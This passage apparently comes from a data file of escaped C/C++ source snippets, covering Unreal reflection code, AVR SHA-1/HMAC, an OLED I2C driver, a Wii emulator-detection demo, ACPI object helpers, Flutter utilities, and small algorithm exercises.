METADATA_PARAMS(UE_ARRAY_COUNT(Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics::Function_MetaDataParams), Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics::Function_MetaDataParams) };\n\tUFunction* Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped()\n\t{\n\t\tstatic UFunction* ReturnFunction = nullptr;\n\t\tif (!ReturnFunction)\n\t\t{\n\t\t\tUECodeGen_Private::ConstructUFunction(&ReturnFunction, Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics::FuncParams);\n\t\t}\n\t\treturn ReturnFunction;\n\t}\n\tstruct Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPushed_Statics\n\t{\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam Function_MetaDataParams[];\n#endif\n\t\tstatic const UECodeGen_Private::FFunctionParams FuncParams;\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPushed_Statics::Function_MetaDataParams[] = {\n\t\t{ \"Category\", \"Widget Reaction\" },\n\t\t{ \"Comment\", \"/**\\n\\x09 * Defines the reaction when the widget is pushed.\\n\\x09 * This function can be overridden to implement specific behavior.\\n\\x09 */\" },\n\t\t{ \"ModuleRelativePath\", \"Public/WidgetReactionInterface.h\" },\n\t\t{ \"ToolTip\", \"Defines the reaction when the widget is pushed.\\nThis function can be overridden to implement specific behavior.\" },\n\t};\n#endif\n\tconst UECodeGen_Private::FFunctionParams Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPushed_Statics::FuncParams = { (UObject*(*)())Z_Construct_UClass_UWidgetReactionInterface, nullptr, \"OnWidgetPushed\", nullptr, nullptr, nullptr, 0, 0, RF_Public|RF_Transient|RF_MarkAsNative, (EFunctionFlags)0x0C020C00, 0, 0, METADATA_PARAMS(UE_ARRAY_COUNT(Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPushed_Statics::Function_MetaDataParams), Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPushed_Statics::Function_MetaDataParams) };\n\tUFunction* Z_Construct_UFu",
    "#include <string.h>\n#include <avr/io.h>\n#include <avr/pgmspace.h>\n#include \"sha1.h\"\n\n#define SHA1_K0 0x5a827999\n#define SHA1_K20 0x6ed9eba1\n#define SHA1_K40 0x8f1bbcdc\n#define SHA1_K60 0xca62c1d6\n\nconst uint8_t sha1InitState[] PROGMEM = {\n  0x01,0x23,0x45,0x67, // H0\n  0x89,0xab,0xcd,0xef, // H1\n  0xfe,0xdc,0xba,0x98, // H2\n  0x76,0x54,0x32,0x10, // H3\n  0xf0,0xe1,0xd2,0xc3  // H4\n};\n\nvoid Sha1Class::init(void) {\n  memcpy_P(state.b,sha1InitState,HASH_LENGTH);\n  byteCount = 0;\n  bufferOffset = 0;\n}\n\nuint32_t Sha1Class::rol32(uint32_t number, uint8_t bits) {\n  return ((number << bits) | (number >> (32-bits)));\n}\n\nvoid Sha1Class::hashBlock() {\n  uint8_t i;\n  uint32_t a,b,c,d,e,t;\n\n  a=state.w[0];\n  b=state.w[1];\n  c=state.w[2];\n  d=state.w[3];\n  e=state.w[4];\n  for (i=0; i<80; i++) {\n    if (i>=16) {\n      t = buffer.w[(i+13)&15] ^ buffer.w[(i+8)&15] ^ buffer.w[(i+2)&15] ^ buffer.w[i&15];\n      buffer.w[i&15] = rol32(t,1);\n    }\n    if (i<20) {\n      t = (d ^ (b & (c ^ d))) + SHA1_K0;\n    } else if (i<40) {\n      t = (b ^ c ^ d) + SHA1_K20;\n    } else if (i<60) {\n      t = ((b & c) | (d & (b | c))) + SHA1_K40;\n    } else {\n      t = (b ^ c ^ d) + SHA1_K60;\n    }\n    t+=rol32(a,5) + e + buffer.w[i&15];\n    e=d;\n    d=c;\n    c=rol32(b,30);\n    b=a;\n    a=t;\n  }\n  state.w[0] += a;\n  state.w[1] += b;\n  state.w[2] += c;\n  state.w[3] += d;\n  state.w[4] += e;\n}\n\nvoid Sha1Class::addUncounted(uint8_t data) {\n  buffer.b[bufferOffset ^ 3] = data;\n  bufferOffset++;\n  if (bufferOffset == BLOCK_LENGTH) {\n    hashBlock();\n    bufferOffset = 0;\n  }\n}\n\n#if defined(ARDUINO) && ARDUINO >= 100\nsize_t\n#else\nvoid\n#endif\nSha1Class::write(uint8_t data) {\n  ++byteCount;\n  addUncounted(data);\n#if defined(ARDUINO) && ARDUINO >= 100\n  return 1;\n#endif\n}\n\nvoid Sha1Class::pad() {\n  // Implement SHA-1 padding (fips180-2 \u00a75.1.1)\n\n  // Pad with 0x80 followed by 0x00 until the end of the block\n  addUncounted(0x80);\n  while (bufferOffset != 56) addUncounted(0x00);\n\n  // Append length in the last 8 bytes\n  addUncounted(0); // We're only using 32 bit lengths\n  addUncounted(0); // But SHA-1 supports 64 bit lengths\n  addUncounted(0); // So zero pad the top bits\n  addUncounted(byteCount >> 29); // Shifting to multiply by 8\n  addUncounted(byteCount >> 21); // as SHA-1 supports bitstreams as well as\n  addUncounted(byteCount >> 13); // byte.\n  addUncounted(byteCount >> 5);\n  addUncounted(byteCount << 3);\n}\n\n\nuint8_t* Sha1Class::result(void) {\n  // Pad to complete the last block\n  pad();\n  \n  // Swap byte order back\n  for (int i=0; i<5; i++) {\n    uint32_t a,b;\n    a=state.w[i];\n    b=a<<24;\n    b|=(a<<8) & 0x00ff0000;\n    b|=(a>>8) & 0x0000ff00;\n    b|=a>>24;\n    state.w[i]=b;\n  }\n  \n  // Return pointer to hash (20 characters)\n  return state.b;\n}\n\n#define HMAC_IPAD 0x36\n#define HMAC_OPAD 0x5c\n\nvoid Sha1Class::initHmac(const uint8_t* key, int keyLength) {\n  uint8_t i;\n  memset(keyBuffer,0,BLOCK_LENGTH);\n  if (keyLength > BLOCK_LENGTH) {\n    // Hash long keys\n    init();\n    for (;keyLength--;) write(*key++);\n    memcpy(keyBuffer,result(),HASH_LENGTH);\n  } else {\n    // Block length keys are used as is\n    memcpy(keyBuffer,key,keyLength);\n  }\n  // Start inner hash\n  init();\n  for (i=0; i<BLOCK_LENGTH; i++) {\n    write(keyBuffer[i] ^ HMAC_IPAD);\n  }\n}\n\nuint8_t* Sha1Class::resultHmac(void) {\n  uint8_t i;\n  // Complete inner hash\n  memcpy(innerHash,result(),HASH_LENGTH);\n  // Calculate outer hash\n  init();\n  for (i=0; i<BLOCK_LENGTH; i++) write(keyBuffer[i] ^ HMAC_OPAD);\n  for (i=0; i<HASH_LENGTH; i++) write(innerHash[i]);\n  return result();\n}\nSha1Class Sha1;\n",
    "#include \"i2c_oled.h\"\r\n#include \"font.h\"\r\n#include \"mbed.h\"\r\n#include \"genshin.h\"\r\n#include <cstdint>\r\n\r\nDigitalOut OLED_SCL(D3);\r\nDigitalOut OLED_SDA(D4);\r\n\r\nuint8_t buffer[144][8];\r\n\r\n/**\r\n * @brief  OLED\u6b21\u65b9\u51fd\u6570\r\n * @retval \u8fd4\u56de\u503c\u7b49\u4e8eX\u7684Y\u6b21\u65b9\r\n */\r\nuint32_t OLED_Pow(uint32_t X, uint32_t Y) {\r\n  uint32_t Result = 1;\r\n  while (Y--) {\r\n    Result *= X;\r\n  }\r\n  return Result;\r\n}\r\n\r\nvoid OLED_W_SCL(uint8_t x) { OLED_SCL = x; }\r\n\r\nvoid OLED_W_SDA(uint8_t x) { OLED_SDA = x; }\r\n\r\nvoid OLED_I2C_Init() {\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(1);\r\n}\r\n\r\nvoid OLED_I2C_Start(void) {\r\n  OLED_W_SDA(1);\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(0);\r\n  OLED_W_SCL(0);\r\n}\r\n\r\n/**\r\n * @brief  I2C\u505c\u6b62\r\n * @param  \u65e0\r\n * @retval \u65e0\r\n */\r\nvoid OLED_I2C_Stop(void) {\r\n  OLED_W_SDA(0);\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(1);\r\n}\r\n\r\n/**\r\n * @brief  I2C\u53d1\u9001\u4e00\u4e2a\u5b57\u8282\r\n * @param  Byte \u8981\u53d1\u9001\u7684\u4e00\u4e2a\u5b57\u8282\r\n * @retval \u65e0\r\n */\r\nvoid OLED_I2C_SendByte(uint8_t Byte) {\r\n  uint8_t i;\r\n  for (i = 0; i < 8; i++) {\r\n    OLED_W_SDA(Byte & (0x80 >> i));\r\n    OLED_W_SCL(1);\r\n    OLED_W_SCL(0);\r\n  }\r\n  OLED_W_SCL(1); //\u989d\u5916\u7684\u4e00\u4e2a\u65f6\u949f\uff0c\u4e0d\u5904\u7406\u5e94\u7b54\u4fe1\u53f7\r\n  OLED_W_SCL(0);\r\n}\r\n\r\n/**\r\n * @brief  OLED\u5199\u547d\u4ee4\r\n * @param  Command \u8981\u5199\u5165\u7684\u547d\u4ee4\r\n * @retval \u65e0\r\n */\r\nvoid OLED_WriteCommand(uint8_t Command) {\r\n  OLED_I2C_Start();\r\n  OLED_I2C_SendByte(0x78); //\u4ece\u673a\u5730\u5740\r\n  OLED_I2C_SendByte(0x00); //\u5199\u547d\u4ee4\r\n  OLED_I2C_SendByte(Command);\r\n  OLED_I2C_Stop();\r\n}\r\n\r\n/**\r\n * @brief  OLED\u5199\u6570\u636e\r\n * @param  Data \u8981\u5199\u5165\u7684\u6570\u636e\r\n * @retval \u65e0\r\n */\r\nvoid OLED_WriteData(uint8_t Data) {\r\n  OLED_I2C_Start();\r\n  OLED_I2C_SendByte(0x78); //\u4ece\u673a\u5730\u5740\r\n  OLED_I2C_SendByte(0x40); //\u5199\u6570\u636e\r\n  OLED_I2C_SendByte(Data);\r\n  OLED_I2C_Stop();\r\n}\r\n\r\nvoid OLED_Genshin() {\r\n  OLED_ClearBuffer();\r\n  OLED_ShowPictureBuffered(0, 0, 128, 64, genshinImage, 0);\r\n  OLED_SendBuffer();\r\n}\r\n\r\n//\u6e05\u9664\u663e\u5b58\r\nvoid OLED_ClearBuffer(void) {\r\n  uint8_t i, n;\r\n  for (i = 0; i < 8; i++) {\r\n    for (n = 0; n < 128; n++) {\r\n      buffer[n][i] = 0; //\u6e05\u9664\u6240\u6709\u6570\u636e\r\n    }\r\n  }\r\n}\r\n\r\n//\u66f4\u65b0\u663e\u5b58\u5230OLED\r\nvoid OLED_SendBuffer(void) {\r\n  uint8_t i, n;\r\n  for (i = 0; i < 8; i++) {\r\n    OLED_WriteCommand(0xb0 + i); //\u8bbe\u7f6e\u884c\u8d77\u59cb\u5730\u5740\r\n    OLED_WriteCommand(0x00);     //\u8bbe\u7f6e\u4f4e\u5217\u8d77\u59cb\u5730\u5740\r\n    OLED_WriteCommand(0x10);     //\u8bbe\u7f6e\u9ad8\u5217\u8d77\u59cb\u5730\u5740\r\n    for (n = 0; n < 128; n++)\r\n      OLED_WriteData(buffer[n][i]);\r\n  }\r\n}\r\n\r\n//\u753b\u70b9\r\n// x:0~127\r\n// y:0~63\r\n// t:1 \u586b\u5145 0,\u6e05\u7a7a\r\nvoid OLED_DrawPointBuffered(uint8_t x, uint8_t y, uint8_t t) {\r\n  uint8_t i, m, n;\r\n  i = y / 8;\r\n  m = y % 8;\r\n  n = 1 << m;\r\n  if (t) {\r\n    buffer[x][i] |= n;\r\n  } else {\r\n    buffer[x][i] = ~buffer[x][i];\r\n    buffer[x][i] |= n;\r\n    buffer[x][i] = ~buffer[x][i];\r\n  }\r\n}\r\n\r\n//\u5728\u6307\u5b9a\u4f4d\u7f6e\u663e\u793a\u4e00\u4e2a\u5b57\u7b26,\u5305\u62ec\u90e8\u5206\u5b57\u7b26\r\n// x:0~127\r\n// y:0~63\r\n// size1:\u9009\u62e9\u5b57\u4f53 6x8/6x12/8x16/12x24\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowCharBuffered(uint8_t x, uint8_t y, uint8_t chr, uint8_t size1,\r\n                           uint8_t mode) {\r\n  uint8_t i, m, temp, size2, chr1;\r\n  uint8_t x0 = x, y0 = y;\r\n  if (size1 == 8)\r\n    size2 = 6;\r\n  else\r\n    size2 = (size1 / 8 + ((size1 % 8) ? 1 : 0)) *\r\n            (size1 / 2); //\u5f97\u5230\u5b57\u4f53\u4e00\u4e2a\u5b57\u7b26\u5bf9\u5e94\u70b9\u9635\u96c6\u6240\u5360\u7684\u5b57\u8282\u6570\r\n  chr1 = chr - ' ';      //\u8ba1\u7b97\u504f\u79fb\u540e\u7684\u503c\r\n  for (i = 0; i < size2; i++) {\r\n    if (size1 == 8) { //\u8c03\u75280806\u5b57\u4f53\r\n      temp = asc2_0806[chr1][i];\r\n    } else if (size1 == 12) { //\u8c03\u75281206\u5b57\u4f53\r\n      temp = asc2_1206[chr1][i];\r\n    } else if (size1 == 16) { //\u8c03\u75281608\u5b57\u4f53\r\n      temp = asc2_1608[chr1][i];\r\n    } else if (size1 == 24) { //\u8c03\u75282412\u5b57\u4f53\r\n      temp = asc2_2412[chr1][i];\r\n    } else\r\n      return;\r\n    for (m = 0; m < 8; m++) {\r\n      if (temp & 0x01)\r\n        OLED_DrawPointBuffered(x, y, mode);\r\n      else\r\n        OLED_DrawPointBuffered(x, y, !mode);\r\n      temp >>= 1;\r\n      y++;\r\n    }\r\n    x++;\r\n    if ((size1 != 8) && ((x - x0) == size1 / 2)) {\r\n      x = x0;\r\n      y0 = y0 + 8;\r\n    }\r\n    y = y0;\r\n  }\r\n}\r\n\r\n//\u663e\u793a\u5b57\u7b26\u4e32\r\n// x,y:\u8d77\u70b9\u5750\u6807\r\n// size1:\u5b57\u4f53\u5927\u5c0f\r\n//*chr:\u5b57\u7b26\u4e32\u8d77\u59cb\u5730\u5740\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowStringBuffered(uint8_t x, uint8_t y, char string[], uint8_t size1,\r\n                             uint8_t mode) {\r\n  uint8_t i=0;\r\n  while ((string[i] >= ' ') && (string[i] <= '~')) //\u5224\u65ad\u662f\u4e0d\u662f\u975e\u6cd5\u5b57\u7b26!\r\n  {\r\n    OLED_ShowCharBuffered(x, y, string[i], size1, mode);\r\n    if (size1 == 8)\r\n      x += 6;\r\n    else\r\n      x += size1 / 2;\r\n    i++;\r\n  }\r\n}\r\n\r\n//\u663e\u793a\u6570\u5b57\r\n// x,y :\u8d77\u70b9\u5750\u6807\r\n// num :\u8981\u663e\u793a\u7684\u6570\u5b57\r\n// len :\u6570\u5b57\u7684\u4f4d\u6570\r\n// size:\u5b57\u4f53\u5927\u5c0f\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowNumBuffered(uint8_t x, uint8_t y, uint32_t num, uint8_t len,\r\n                          uint8_t size1, uint8_t mode) {\r\n  uint8_t t, temp, m = 0;\r\n  if (size1 == 8)\r\n    m = 2;\r\n  for (t = 0; t < len; t++) {\r\n    temp = (num / OLED_Pow(10, len - t - 1)) % 10;\r\n    if (temp == 0) {\r\n      OLED_ShowCharBuffered(x + (size1 / 2 + m) * t, y, '0', size1, mode);\r\n    } else {\r\n      OLED_ShowCharBuffered(x + (size1 / 2 + m) * t, y, temp + '0', size1,\r\n                            mode);\r\n    }\r\n  }\r\n}\r\n\r\n//\u753b\u7ebf\r\n// x1,y1:\u8d77\u70b9\u5750\u6807\r\n// x2,y2:\u7ed3\u675f\u5750\u6807\r\nvoid OLED_DrawLineBuffered(uint8_t x1, uint8_t y1, uint8_t x2, uint8_t y2,\r\n                           uint8_t mode) {\r\n  uint16_t t;\r\n  int xerr = 0, yerr = 0, delta_x, delta_y, distance;\r\n  int incx, incy, uRow, uCol;\r\n  delta_x = x2 - x1; //\u8ba1\u7b97\u5750\u6807\u589e\u91cf\r\n  delta_y ",
    "#include <wiiuse/wpad.h>\n\n#include <cstdio>\n#include <cstdlib>\n\nstatic constexpr size_t expectedTickDifference = 1;\n\nstatic void InitVideo();\n\nint main(int /* argc */, char * /* argv */[]) {\n    InitVideo();\n    WPAD_Init();\n\n    printf(\"\\x1b[2;0H\");\n    printf(\"Dolphin Anti-Emulation Techniques by MikeIsAStar\\n\\n\");\n\n    size_t tickDifference;\n    {\n        size_t startTick;\n        size_t endTick;\n\n        u32 interruptsEnabled = IRQ_Disable();\n        {\n            asm volatile(\"sync\");\n            asm volatile(\"mftbl %0\" : \"=r\"(startTick));\n            asm volatile(\"sync\");\n            asm volatile(\"mftbl %0\" : \"=r\"(endTick));\n            asm volatile(\"sync\");\n        }\n        IRQ_Restore(interruptsEnabled);\n\n        tickDifference = endTick - startTick;\n    }\n\n    const char *platform;\n    if (tickDifference != expectedTickDifference) {\n        platform = \"Emulator\";\n    } else {\n        platform = \"Console\";\n    }\n\n    printf(\"Platform: %s\", platform);\n\n    while (true) {\n        WPAD_ScanPads();\n\n        u32 buttonsDown = WPAD_ButtonsDown(0);\n        if (buttonsDown & WPAD_BUTTON_HOME) {\n            break;\n        }\n\n        VIDEO_WaitVSync();\n    }\n\n    return EXIT_SUCCESS;\n}\n\nstatic void InitVideo() {\n    VIDEO_Init();\n\n    GXRModeObj *renderMode = VIDEO_GetPreferredMode(NULL);\n    void *xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(renderMode));\n    CON_Init(xfb, 20, 20, renderMode->fbWidth, renderMode->xfbHeight,\n            renderMode->fbWidth * VI_DISPLAY_PIX_SZ);\n\n    VIDEO_Configure(renderMode);\n    VIDEO_SetNextFramebuffer(xfb);\n    VIDEO_SetBlack(false);\n    VIDEO_Flush();\n    VIDEO_WaitVSync();\n    if (renderMode->viTVMode & VI_NON_INTERLACE) {\n        VIDEO_WaitVSync();\n    }\n}\n",
    "#include \"qacpi/object.hpp\"\n\nnamespace qacpi {\n\tBuffer::Buffer(Buffer&& other) noexcept {\n\t\tdata = move(other.data);\n\t}\n\n\tbool Buffer::init(const void* new_data, uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<uint8_t*>(qacpi_os_malloc(new_size));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tmemcpy(ptr, new_data, new_size);\n\t\t\tdata->data = ptr;\n\t\t\tdata->size = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Buffer::init_with_size(uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<uint8_t*>(qacpi_os_malloc(new_size));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tmemset(ptr, 0, new_size);\n\t\t\tdata->data = ptr;\n\t\t\tdata->size = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Buffer::clone(const Buffer& other) {\n\t\treturn init(other.data->data, other.data->size);\n\t}\n\n\tBuffer::Data::~Data() {\n\t\tif (data) {\n\t\t\tqacpi_os_free(data, size);\n\t\t}\n\t}\n\n\tPackage::Package(Package&& other) noexcept {\n\t\tdata = move(other.data);\n\t}\n\n\tbool Package::init(uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<ObjectRef*>(qacpi_os_malloc(new_size * sizeof(ObjectRef)));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tfor (uint32_t i = 0; i < new_size; ++i) {\n\t\t\t\tconstruct<ObjectRef>(&ptr[i], ObjectRef::empty());\n\t\t\t}\n\t\t\tdata->elements = ptr;\n\t\t\tdata->element_count = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Package::clone(const Package& other) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (other.data->element_count) {\n\t\t\tauto* ptr = static_cast<ObjectRef*>(qacpi_os_malloc(other.data->element_count * sizeof(ObjectRef)));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tfor (uint32_t i = 0; i < other.data->element_count; ++i) {\n\t\t\t\tconstruct<ObjectRef>(&ptr[i], ObjectRef {});\n\t\t\t\tif (!ptr[i] || !other.data->elements[i]->data.clone(ptr[i]->data)) {\n\t\t\t\t\tfor (uint32_t j = 0; j <= i; ++j) {\n\t\t\t\t\t\tptr[j].~SharedPtr();\n\t\t\t\t\t}\n\t\t\t\t\tqacpi_os_free(ptr, other.data->element_count * sizeof(ObjectRef));\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tdata->elements = ptr;\n\t\t\tdata->element_count = other.data->element_count;\n\t\t}\n\t\treturn true;\n\t}\n\n\tPackage::Data::~Data() {\n\t\tif (elements) {\n\t\t\tfor (uint32_t i = 0; i < element_count; ++i) {\n\t\t\t\telements[i].~SharedPtr();\n\t\t\t}\n\t\t\tqacpi_os_free(elements, element_count * sizeof(ObjectRef));\n\t\t}\n\t}\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"bits/stdc++.h\"\nusing namespace std;\n \nstruct TrieNode {\n    TrieNode* children[2];\n    bool isEndOfWord;\n    int count[2];\n};\n \nstruct TrieNode* root;\n \nstruct TrieNode* getNewTrieNode() {\n    struct TrieNode* newNode = new TrieNode;\n    newNode->isEndOfWord = false;\n    for(int i = 0; i < 2; i++) {\n        newNode->children[i] = NULL;\n        newNode->count[i] = 0;\n    }\n    return newNode;\n}\n \nvoid insertWord(string word) {\n    struct TrieNode* current = root;\n    char ch;\n    int index = 0;\n    for (int i = 0; i < word.length(); i++) {\n        ch = word[i];\n        if(ch == 'L')\n            index = 0;\n        else\n            index = 1;\n        if (current->children[index] == NULL) {\n            struct TrieNode* newNode = getNewTrieNode();\n            (current->children)[index] = newNode;\n            (current->count)[index] = 1;\n        }\n        else {\n            current->count[index] = (current->count)[index] + 1;\n        }\n        current = (current->children)[index];\n    }\n    current->isEndOfWord = true;\n}\n \nvoid countWords(vector<string>& words, vector<string>& prefixes) {\n    root = getNewTrieNode();\n    int n = words.size();\n \n    for (int i = 0; i < n; i++) {\n        insertWord(words[i]);\n    }\n \n    char ch;\n    int wordCount = 0;\n    string prefix;\n    int index = 0;\n    for(int j = 0; j < prefixes.size(); j++) {\n        prefix = prefixes[j];\n        wordCount = 0;\n        struct TrieNode* current = root;\n        for (int i = 0; prefix[i]; i++) {\n            ch = prefix[i];\n            if(ch == 'L')\n                index = 0;\n            else\n                index = 1;\n            if (current->children[index] == NULL) {\n                wordCount = 0;\n                break;\n            }\n            wordCount = (current->count)[index];\n            current = (current->children)[index];\n        }\n        cout << wordCount << endl;\n    }\n}\n \nint main() {\n    int n, q;\n    cin >> n >> q;\n    vector<string> words(n), queries(q);\n    string str;\n    for(int i = 0; i < n; i++) {\n        cin >> words[i];\n    }\n    for(int i = 0; i < q; i++) {\n        cin >> queries[i];\n    }\n    countWords(words, queries);\n    return 0;\n}",
    "#include <stdio.h>\r\n#include <locale.h>\r\n\r\nint main(){\r\n\tsetlocale(LC_ALL, \"Portuguese\");\r\n\tint a[2][3], b[2][3], x = 1, i, j;\r\n\t//La\u00e7o para receber os valores de A\r\n\tprintf(\"Matriz A:\\n\");\r\n\tfor(i = 0; i < 2; i++){\r\n\t\tfor(j = 0; j < 3; j++){\r\n\t\t\tprintf(\"Digite o %i\u00ba valor: \", x++);\r\n\t\t\tscanf(\"%i\", &a[i][j]);\r\n\t\t}\r\n\t}\r\n\t//La\u00e7o para receber os valores de B\r\n    printf(\"\\n\\nMatriz B:\\n\");\r\n\tx = 1;\r\n\tfor(i = 0; i < 2; i++){\r\n\t\tfor(j = 0; j < 3; j++){\r\n\t\t\tprintf(\"Digite o %i\u00ba valor: \", x++);\r\n\t\t\tscanf(\"%i\", &b[i][j]);\r\n\t\t}\r\n\t}\r\n\t//Exibir Matriz A\r\n\t\tprintf(\"\\nMatriz A:\\n\");\r\n\tfor(i = 0; i < 2; i++){\r\n\t\tfor(j = 0; j < 3; j++){\r\n\t\t\tprintf(\"%i\\t\", a[i][j]);\r\n\t\t}\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n\t//Exibir Matriz B\r\n\t\tprintf(\"\\nMatriz B:\\n\");\r\n\tfor(i = 0; i < 2; i++){\r\n\t\tfor(j = 0; j < 3; j++){\r\n\t\t\tprintf(\"%i\\t\", b[i][j]);\r\n\t\t}\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n\t//La\u00e7o para exibir a soma das matrizes A + B\r\n\tprintf(\"\\nSoma das matrizes A e B:\\n\");\r\n\tfor(i = 0; i < 2; i++){\r\n\t\tfor(j = 0; j < 3; j++){\r\n\t\t\tprintf(\"%i\\t\", a[i][j] + b[i][j]);\r\n\t\t}\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n\treturn 0;\r\n}\r\n",
    "#include \"random.h\"\n\n#include <ctime>\n\n_VTL_START\n\nstatic unsigned int* detail_random::wrand_seed()\n{\n    static unsigned int m_seed = 1;\n    return &m_seed;\n}\n\nstatic unsigned int* detail_random::xrand_seed()\n{\n    static unsigned int m_seed = 1;\n    return &m_seed;\n}\n\nvoid swrand(unsigned int seed)\n{\n    wrseed = seed;\n}\n\nvoid sxrand(unsigned int seed)\n{\n    xrseed = seed;\n}\n\nunsigned int wrand(unsigned int seed)\n{\n    wrseed = wrseed * seed;\n    wrseed = (1103515245 * wrseed + 12345) & 0x7FFFFFFF;\n    return wrseed;\n}\n\nunsigned int xrand(unsigned int seed) \n{\n    xrseed ^= (xrseed << 13);\n    xrseed ^= (xrseed >> 17);\n    xrseed ^= (xrseed << 5);\n    xrseed += seed;\n    return xrseed;\n}\n\nVTL_CONSTEXPR20 float float_from_bits(const uint32_t i) noexcept\n{\n    return (i >> 8) * 0x1.0p-24f;\n}\n\nVTL_CONSTEXPR20 double double_from_bits(const uint64_t i) noexcept\n{\n    return (i >> 11) * 0x1.0p-53;\n}\n\n#define MT_M32(x) (0x80000000 & x)\n#define MT_L32(x) (0x7FFFFFFF & x)\n#define UNROLL(st, x, i, i1, i2, i3, i4)    x = MT_M32(st.mt[i1]) | MT_L32(st.mt[i2]);                                              \\\n                                            st.mt[i3] = state.mt[i4] ^ (x >> 1) ^ (((int32_t(x) << 31) >> 31) & detail_random::mt::MTconstants::magic);\\\n                                            ++i;\n\nunsigned int random_device::operator()()\n{\n    return xrand(static_cast<unsigned int>(time(NULL)));\n}\n\nmersenne_twister::mersenne_twister(uint32_t value)\n{\n    seed(value);\n}\n\nmersenne_twister::mersenne_twister(random_device rand_device)\n{\n    seed(rand_device());\n}\n\nvoid mersenne_twister::seed(uint32_t value)\n{\n    state.mt[0] = value;\n    state.index = detail_random::mt::MTconstants::size;\n    for (uint_fast32_t i = 1; i < detail_random::mt::MTconstants::size; ++i)\n        state.mt[i] = 0x6c078965 * (state.mt[i - 1] ^ state.mt[i - 1] >> 30) + i;\n}\n\nuint32_t mersenne_twister::rand_u32()\n{\n    if (state.index == detail_random::mt::MTconstants::size)\n    {\n        generate_numbers();\n        state.index = 0;\n    }\n    return state.mt_temperred[state.index++];\n}\n\nuint32_t mersenne_twister::operator()()\n{\n    return rand_u32();\n}\n\nvoid mersenne_twister::generate_numbers() noexcept\n{\n    size_t i = 0;\n    uint32_t x = 0;\n    \n    while (i < detail_random::mt::MTconstants::diff)\n    {\n        UNROLL(state, x, i, i, i + 1, i, i + detail_random::mt::MTconstants::period);\n#ifdef _VTL_MT_UNROLL_MORE\n        UNROLL(state, x, i, i, i + 1, i, i + detail_random::mt::MTconstants::period);\n#endif // _VTL_MT_UNROLL_MORE\n    }\n    while (i < detail_random::mt::MTconstants::size - 1)\n    {\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n#ifdef _VTL_MT_UNROLL_MORE\n        UNROLL(state, x, i, i, i + 1, i, i - 